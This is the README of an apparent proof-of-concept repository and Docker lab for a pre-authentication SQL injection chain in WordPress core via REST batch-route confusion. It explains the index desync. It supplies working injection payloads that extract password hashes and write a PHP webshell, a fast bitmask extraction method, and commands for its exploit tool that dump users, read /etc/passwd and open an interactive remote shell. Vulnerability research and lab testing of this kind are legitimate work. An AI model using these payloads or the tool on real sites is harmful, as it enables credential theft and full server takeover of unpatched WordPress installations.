# wp2shell-lab

Educational PoC and lab for **CVE-2026-63030 + CVE-2026-60137** — pre-authentication SQL injection in WordPress core via REST batch-route confusion.

Discovered by Adam Kues (Searchlight Cyber / Assetnote). Fixed in WordPress 6.9.5 / 7.0.2.

## The exploit

### Step 1: The batch endpoint is unauthenticated

`POST /wp-json/batch/v1` bundles multiple REST API calls into one request. It has **no auth check** — security is delegated to each sub-request's own permission callback.

### Step 2: The desync

`serve_batch_request_v1()` builds two parallel arrays:

- `$matches[]` — which handler to **dispatch** each sub-request to
- `$validation[]` — whether each sub-request **passed validation**

It indexes both by the same offset during dispatch. The bug: when a sub-request's path fails `wp_parse_url()`, a `WP_Error` is pushed to `$validation` but **not** `$matches`. This shifts `$matches` by one, so each subsequent sub-request is dispatched to the **wrong handler**.

### Step 3: Double nesting

The desync is used **twice**:

1. **Outer batch** — a `/wp/v2/posts` request carrying an inner batch as its body gets dispatched under the **batch handler** (self-call). Since it was validated as a posts request, the inner `requests` array was never checked against the batch schema. This bypasses the method allowlist — inner sub-requests can use GET.

2. **Inner batch** — a `/wp/v2/categories?author_exclude=<SQLI>` request gets dispatched under posts `get_items()`. The categories schema doesn't define `author_exclude`, so it passes validation untouched. But posts `get_items()` maps it to `WP_Query::author__not_in`, where the value is interpolated raw into SQL.

### Step 4: The SQL injection

The vulnerable `WP_Query` code only sanitized `author__not_in` when it was already an array:

```php
// PRE-FIX (vulnerable)
if (is_array($query_vars['author__not_in'])) {
    $query_vars['author__not_in'] = array_map('absint', ...);  // sanitize
}
$author__not_in = implode(',', (array) $query_vars['author__not_in']);
$where .= " AND post_author NOT IN ($author__not_in) ";        // raw interpolation
```

A string value bypasses the `is_array()` gate entirely. The `(array)` cast wraps it without sanitizing.

### Step 5: What you can do with it

**Read the database** (every affected site):
```
author_exclude = 0) AND (ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1)) > 80)-- -
```
Boolean oracle: posts returned = true, empty = false. Binary search per character.

**Write files** (requires MySQL FILE privilege — not the default):
```
author_exclude = 0) AND 1=0 UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/path/shell.php'-- -
```

## The batch desync

```
 ATTACKER (anonymous)
    │
    │  POST /?rest_route=/batch/v1          ← no auth required
    │
    ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │  OUTER BATCH  (serve_batch_request_v1)                          │
 │                                                                  │
 │  sub-requests:                                                   │
 │    [0]  "http://"            ← fails wp_parse_url()              │
 │    [1]  POST /wp/v2/posts    ← body carries inner batch          │
 │    [2]  POST /batch/v1       ← supplies batch handler            │
 │                                                                  │
 │  $validation:  [ error,  OK(posts),     OK(batch)     ]          │
 │  $matches:     [         posts_handler, batch_handler  ]         │
 │                 ↑                                                │
 │                 BUG: error skipped in $matches, arrays misalign  │
 │                                                                  │
 │  dispatch: request[1] (posts) gets $matches[1] (batch handler)  │
 │            → posts body executed as a nested batch               │
 └──────────────────────────────┬───────────────────────────────────┘
                                │
                                ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │  INNER BATCH  (recursive serve_batch_request_v1)                │
 │                                                                  │
 │  sub-requests:                                                   │
 │    [0]  "http://"            ← same desync trick                 │
 │    [1]  POST /categories     ← author_exclude=<SQLI>            │
 │    [2]  GET  /wp/v2/posts    ← supplies posts handler            │
 │                                                                  │
 │  Same misalignment:                                              │
 │  request[1] (categories) gets $matches[1] (posts get_items)     │
 │                                                                  │
 │  categories schema has no author_exclude → value unsanitized    │
 │  posts get_items maps author_exclude → WP_Query::author__not_in │
 │                                                                  │
 │  → SQL INJECTION                                                 │
 └──────────────────────────────────────────────────────────────────┘
```

## Fast extraction via X-WP-Total bitmask oracle

Existing PoCs use blind boolean extraction — 1 bit per HTTP request, ~224 requests for a password hash. This repo combines two techniques for ~75x faster extraction.

**X-WP-Total oracle.** WordPress adds `SQL_CALC_FOUND_ROWS` to post queries and puts the count in the `X-WP-Total` response header. UNION rows are counted at the SQL level even though PHP filters them from the response body. Conditional UNIONs encode individual bits:

```sql
0) AND 1=0
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 1) > 0   -- bit 0
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
...                                                            -- bits 2-6
-- -
```

`X-WP-Total` = 0 (bit not set) or 1 (bit set). Seven probes = one full ASCII character.

**Unlimited inner batch.** The outer batch validates `maxItems: 25` via its schema. The route confusion bypasses this — the inner batch runs recursively with no size check. All 7 bit-probes for multiple characters pack into one request.

16 chars × 7 bits = 112 probes per request. A 34-char phpass hash in ~3 requests instead of ~224.

## Quick start

```bash
# bring up the vulnerable lab
cd docker && ./setup.sh
cd ..

# detect
python3 -m exploit check http://localhost:8888
python3 -m exploit check http://localhost:8888 --confirm-sqli

# extract data (fast mode, default)
python3 -m exploit extract http://localhost:8888 --preset fingerprint
python3 -m exploit extract http://localhost:8888 --preset users

# extract data (blind mode, for comparison)
python3 -m exploit extract http://localhost:8888 --mode blind --preset fingerprint

# custom SQL query
python3 -m exploit extract http://localhost:8888 --query "SELECT @@version"

# RCE (requires FILE privilege — the lab grants it)
python3 -m exploit rce http://localhost:8888 --cmd "id"
python3 -m exploit rce http://localhost:8888 --cmd "cat /etc/passwd"
python3 -m exploit rce http://localhost:8888 -i   # interactive shell

# proxy through Burp
python3 -m exploit extract http://localhost:8888 --proxy http://127.0.0.1:8080

# tear down
cd docker && ./setup.sh down
```

## References

- [WordPress 7.0.2 release](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
- [Searchlight Cyber advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core)
- [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) (route confusion)
- [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) (SQLi)
- [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) — blind SQLi + post-auth webshell
- [AdnaneKhan/Wp2Shell-RCE](https://github.com/AdnaneKhan/Wp2Shell-RCE) — INTO OUTFILE RCE with Docker lab
- [sergiointel/wp2shell-poc](https://github.com/sergiointel/wp2shell-poc) — minimal timing-based PoC

## Legal

For authorized security testing and education only. Use exclusively against systems you own or have explicit written permission to test.
